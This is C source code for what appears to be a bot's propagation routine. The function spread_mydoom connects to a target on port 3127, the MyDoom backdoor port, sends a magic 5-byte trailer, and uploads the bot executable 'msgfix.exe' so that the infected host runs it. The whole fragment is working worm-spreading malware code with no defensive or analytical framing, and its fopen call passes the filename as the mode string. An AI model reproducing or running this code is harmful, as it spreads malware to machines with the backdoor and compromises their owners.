

BYTE MyDoomTrailor[] = "\x85\x13\x3c\x9e\xa2";

int spread_mydoom( char* pszTarget )
{
	char* pszFile;
	unsigned short nPort = 3127;
	FILE* pFile;
	WSAData strWSAData;
	hostent* pstrTarget;
	SOCKET sSock;
	sockaddr_in strAddr;

	pszFile		= "msgfix.exe"; //bot filename

	// open the file
	pFile = fopen( pszFile, "msgfix.exe" );
	if( !pFile )
	{
		return EXIT_FAILURE;
	}

	// windows startup
	WSAStartup( MAKEWORD( 1, 1 ), &strWSAData );
	
	// get target
	pstrTarget = gethostbyname( pszTarget );
	if( !pstrTarget )
	{
		return EXIT_FAILURE;
	}
	memset( &strAddr, 0, sizeof( strAddr ) );
	strAddr.sin_family	= AF_INET;
	strAddr.sin_addr	= *(in_addr*)pstrTarget->h_addr;
	strAddr.sin_port	= htons( nPort );
	
	// create socket
	sSock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if( sSock == INVALID_SOCKET )
	{
		fclose( pFile );
		return EXIT_FAILURE;
	}

	// connect
	if( connect( sSock, (sockaddr*)&strAddr, sizeof( strAddr ) ) == SOCKET_ERROR )
	{
		fclose( pFile );
		closesocket( sSock );
		
		return EXIT_FAILURE;
	}

	// send trailor
	if( send( sSock, (char*)MyDoomTrailor, 5, 0 ) != 5 )
	{
		fclose( pFile );
		closesocket( sSock );
		
		return EXIT_FAILURE;
	}
	
	// send file
	char szBuffer[ 1024 ];
	while( !feof( pFile ) )
	{
		// read
		int nRead = fread( szBuffer, 1, sizeof( szBuffer ), pFile );
		
		// send
		int nSent = send( sSock, szBuffer, nRead, 0 );
		if( nRead != nSent )
		{
			fclose( pFile );
			closesocket( sSock );
		
			return EXIT_FAILURE;
		}
	}

	// clean up
	fclose( pFile );
	closesocket( sSock );

	return EXIT_SUCCESS;
}
